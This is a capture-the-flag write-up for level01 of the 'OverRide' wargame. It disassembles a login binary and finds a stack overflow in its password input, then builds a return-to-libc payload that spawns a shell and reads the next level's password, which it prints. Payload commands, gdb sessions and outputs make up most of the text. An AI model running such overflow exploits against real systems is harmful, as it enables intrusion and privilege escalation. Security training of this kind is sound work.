# Level 01

## GDB Utils

```
info func

0x08048360  printf
0x08048360  printf@plt
0x08048370  fgets
0x08048370  fgets@plt
0x08048380  puts
0x08048380  puts@plt
0x080483a0  __libc_start_main
0x080483a0  __libc_start_main@plt
0x080483b0  _start
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main

info var

0x08048688  _fp_hw
0x0804868c  _IO_stdin_used
0x08048898  __FRAME_END__
0x08049f14  __CTOR_LIST__
0x08049f14  __init_array_end
0x08049f14  __init_array_start
0x08049f18  __CTOR_END__
0x08049f1c  __DTOR_LIST__
0x08049f20  __DTOR_END__
0x08049f24  __JCR_END__
0x08049f24  __JCR_LIST__
0x08049f28  _DYNAMIC
0x08049ff4  _GLOBAL_OFFSET_TABLE_
0x0804a014  __data_start
0x0804a014  data_start
0x0804a018  __dso_handle
0x0804a020  stdin@@GLIBC_2.0
0x0804a024  completed.6159
0x0804a028  dtor_idx.6161
0x0804a040  a_user_name
```

There is 3 function we can disassembly

verify_user_name()
verify_user_pass()
main()

```
(gdb) disas verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   0x08048467 <+3>:     push   %edi
   0x08048468 <+4>:     push   %esi
   0x08048469 <+5>:     sub    $0x10,%esp
   0x0804846c <+8>:     movl   $0x8048690,(%esp)
   0x08048473 <+15>:    call   0x8048380 <puts@plt>
   0x08048478 <+20>:    mov    $0x804a040,%edx
   0x0804847d <+25>:    mov    $0x80486a8,%eax
   0x08048482 <+30>:    mov    $0x7,%ecx
   0x08048487 <+35>:    mov    %edx,%esi
   0x08048489 <+37>:    mov    %eax,%edi
   0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:    seta   %dl
   0x08048490 <+44>:    setb   %al
   0x08048493 <+47>:    mov    %edx,%ecx
   0x08048495 <+49>:    sub    %al,%cl
   0x08048497 <+51>:    mov    %ecx,%eax
   0x08048499 <+53>:    movsbl %al,%eax
   0x0804849c <+56>:    add    $0x10,%esp
   0x0804849f <+59>:    pop    %esi
   0x080484a0 <+60>:    pop    %edi
   0x080484a1 <+61>:    pop    %ebp
   0x080484a2 <+62>:    ret
```

```
(gdb) disas verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:     push   %ebp
   0x080484a4 <+1>:     mov    %esp,%ebp
   0x080484a6 <+3>:     push   %edi
   0x080484a7 <+4>:     push   %esi
   0x080484a8 <+5>:     mov    0x8(%ebp),%eax
   0x080484ab <+8>:     mov    %eax,%edx
   0x080484ad <+10>:    mov    $0x80486b0,%eax
   0x080484b2 <+15>:    mov    $0x5,%ecx
   0x080484b7 <+20>:    mov    %edx,%esi
   0x080484b9 <+22>:    mov    %eax,%edi
   0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi)
   0x080484bd <+26>:    seta   %dl
   0x080484c0 <+29>:    setb   %al
   0x080484c3 <+32>:    mov    %edx,%ecx
   0x080484c5 <+34>:    sub    %al,%cl
   0x080484c7 <+36>:    mov    %ecx,%eax
   0x080484c9 <+38>:    movsbl %al,%eax
   0x080484cc <+41>:    pop    %esi
   0x080484cd <+42>:    pop    %edi
   0x080484ce <+43>:    pop    %ebp
   0x080484cf <+44>:    ret
```

```
(gdb) disas main
   0x080484d0 <+0>:     push   %ebp
   0x080484d1 <+1>:     mov    %esp,%ebp
   0x080484d3 <+3>:     push   %edi
   0x080484d4 <+4>:     push   %ebx
   0x080484d5 <+5>:     and    $0xfffffff0,%esp
   0x080484d8 <+8>:     sub    $0x60,%esp
   0x080484db <+11>:    lea    0x1c(%esp),%ebx
   0x080484df <+15>:    mov    $0x0,%eax
   0x080484e4 <+20>:    mov    $0x10,%edx
   0x080484e9 <+25>:    mov    %ebx,%edi
   0x080484eb <+27>:    mov    %edx,%ecx
   0x080484ed <+29>:    rep stos %eax,%es:(%edi)
   0x080484ef <+31>:    movl   $0x0,0x5c(%esp)
   0x080484f7 <+39>:    movl   $0x80486b8,(%esp)
   0x080484fe <+46>:    call   0x8048380 <puts@plt>
   0x08048503 <+51>:    mov    $0x80486df,%eax
   0x08048508 <+56>:    mov    %eax,(%esp)
   0x0804850b <+59>:    call   0x8048360 <printf@plt>
   0x08048510 <+64>:    mov    0x804a020,%eax
   0x08048515 <+69>:    mov    %eax,0x8(%esp)
   0x08048519 <+73>:    movl   $0x100,0x4(%esp)
   0x08048521 <+81>:    movl   $0x804a040,(%esp)
   0x08048528 <+88>:    call   0x8048370 <fgets@plt>
   0x0804852d <+93>:    call   0x8048464 <verify_user_name>
   0x08048532 <+98>:    mov    %eax,0x5c(%esp)
   0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
   0x0804853b <+107>:   je     0x8048550 <main+128>
   0x0804853d <+109>:   movl   $0x80486f0,(%esp)
   0x08048544 <+116>:   call   0x8048380 <puts@plt>
   0x08048549 <+121>:   mov    $0x1,%eax
   0x0804854e <+126>:   jmp    0x80485af <main+223>
   0x08048550 <+128>:   movl   $0x804870d,(%esp)
   0x08048557 <+135>:   call   0x8048380 <puts@plt>
   0x0804855c <+140>:   mov    0x804a020,%eax
   0x08048561 <+145>:   mov    %eax,0x8(%esp)
   0x08048565 <+149>:   movl   $0x64,0x4(%esp)
   0x0804856d <+157>:   lea    0x1c(%esp),%eax
   0x08048571 <+161>:   mov    %eax,(%esp)
   0x08048574 <+164>:   call   0x8048370 <fgets@plt>
   0x08048579 <+169>:   lea    0x1c(%esp),%eax
   0x0804857d <+173>:   mov    %eax,(%esp)
   0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:   mov    %eax,0x5c(%esp)
   0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
   0x0804858e <+190>:   je     0x8048597 <main+199>
   0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)
   0x08048595 <+197>:   je     0x80485aa <main+218>
   0x08048597 <+199>:   movl   $0x804871e,(%esp)
   0x0804859e <+206>:   call   0x8048380 <puts@plt>
   0x080485a3 <+211>:   mov    $0x1,%eax
   0x080485a8 <+216>:   jmp    0x80485af <main+223>
   0x080485aa <+218>:   mov    $0x0,%eax
   0x080485af <+223>:   lea    -0x8(%ebp),%esp
   0x080485b2 <+226>:   pop    %ebx
   0x080485b3 <+227>:   pop    %edi
   0x080485b4 <+228>:   pop    %ebp
   0x080485b5 <+229>:   ret
```

That's a lot of assembly, lets use IDA and see what's going on.

## IDA

```c
BOOL verify_user_name()
{
  puts("verifying username....\n");
  return memcmp(&a_user_name, "dat_wil", 7u) != 0;
}
 
BOOL __cdecl verify_user_pass(const void *a1)
{
  return memcmp(a1, "admin", 5u) != 0;
}


int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  int v5; // [esp+5Ch] [ebp-Ch]

  memset(v4, 0, sizeof(v4));
  v5 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(&a_user_name, 256, stdin);
  v5 = verify_user_name();
  if ( v5 )
  {
    puts("nope, incorrect username...\n");
  }
  else
  {
    puts("Enter Password: ");
    fgets(v4, 100, stdin);
    v5 = verify_user_pass(v4);
    puts("nope, incorrect password...\n");
  }
  return 1;
}
```

The binary seems to use fgets in order to call verif_user_name(), the a_user_name buffer isn't initialised in the main function, so it might be a global.

I tried to overflow that buffer, the fgets is limited to 256, and its not overflowing, so the buffer size is at least superior or equal than 256 byte.

The v4 buffer however is filled by the second call of fgets() which limit the input to 100 byte, which mean we can overflow by 36 byte, which is way enough to insert any malicious bytes.



Lets check the binary behavior

```sh
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: kika
verifying username....

nope, incorrect username...

level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: hey
verifying username....

nope, incorrect username...

level01@OverRide:~$
```

The binary await a right username, lets check what it is actually checking.

```c
BOOL verify_user_name()
{
  puts("verifying username....\n");
  return memcmp(&a_user_name, "dat_wil", 7u) != 0;
}
```

Its actually actually calling the function verify_user_name on our first input, it must be equal to "dat_wil".

Lets test this.

```sh
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
nowweneedapassword
nope, incorrect password...

level01@OverRide:~$
```

Username is right, now we need the password, lets read the IDA output again.

Obviously its using the verify_user_pass() function :

```c
BOOL __cdecl verify_user_pass(const void *a1)
{
  return memcmp(a1, "admin", 5u) != 0;
}
```

Lets test that.

```sh
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...

level01@OverRide:~$
```

Its still says its incorrect, but when we take a look at the code we see that's normal.


```c
  fgets(&a_user_name, 256, stdin);
  v5 = verify_user_name();
  if ( v5 )
  {
    puts("nope, incorrect username...\n");
  }
  else
  {
    puts("Enter Password: ");
    fgets(v4, 100, stdin);
    v5 = verify_user_pass(v4);
    puts("nope, incorrect password...\n");
  }
  return 1;
```

Even if the password is right or wrong the result is still the same.

We dont see any call of system() with /bin/sh so we gotta use an exploit.

Lets see what we can do.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  int v5; // [esp+5Ch] [ebp-Ch]

  memset(v4, 0, sizeof(v4));
  v5 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(&a_user_name, 256, stdin);
  v5 = verify_user_name();
  if ( v5 )
  {
    puts("nope, incorrect username...\n");
  }
  else
  {
    puts("Enter Password: ");
    fgets(v4, 100, stdin);
    v5 = verify_user_pass(v4);
    puts("nope, incorrect password...\n");
  }
  return 1;
}
```

We will overflow the v4 buffer and see what exploit we can use.

```sh
level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A' * 256" | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

Segmentation fault (core dumped)
level01@OverRide:~$
```

It successfully overflowed, we used the 'dat_wil' uesrname, and a '\n' in order to enter the second call of fgets() which is exploitable.

Lets see if we can control the EIP.

```sh
level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A' * 256" > /tmp/exploit

level01@OverRide:~$ gdb ./level01
(gdb) run < /tmp/exploit
Starting program: /home/users/level01/level01 < /tmp/exploit
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

We overwrote the EIP so we can control it.


After gradually increasing the number of A we find exacly when the EIP is getting overwritten.

```sh
level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A' * 80" > /tmp/exploit
level01@OverRide:~$ gdb ./level01
(gdb) run < /tmp/exploit
Starting program: /home/users/level01/level01 < /tmp/exploit
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0xf7e4000a in ?? () from /lib32/libc.so.6
```

And if we give 4 more byte...

```sh
level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A' * 84" > /tmp/exploit
level01@OverRide:~$ gdb ./level01
(gdb) run < /tmp/exploit
Starting program: /home/users/level01/level01 < /tmp/exploit
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

We control the EIP.

The program doesn't have any call or function that execute a shell, or anything that can give us the next password.

So im going to try a return-to-Libc exploit, since we control the EIP, that the binary loads the libc, and that we have 32 byte to write.

The exploit will look like this
```sh
python -c "print 'dat_wil' + '\n' + 'A' * 80 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7'" | ./level01
```

Using the system() addresses, and then random byte ( i could give the exit to not print log but whatever ), and then address of "/bin/sh".

```sh
level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A' * 80 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7'" | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

Segmentation fault (core dumped)
level01@OverRide:~$
```

Lets check by keeping an input.

```sh
level01@OverRide:~$ (python -c "print 'dat_wil' + '\n' + 'A' * 80 + '\xd0\xae\xe6\xf7' + 'AAAA' + '\xec\x97\xf8\xf7'"; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

And it worked !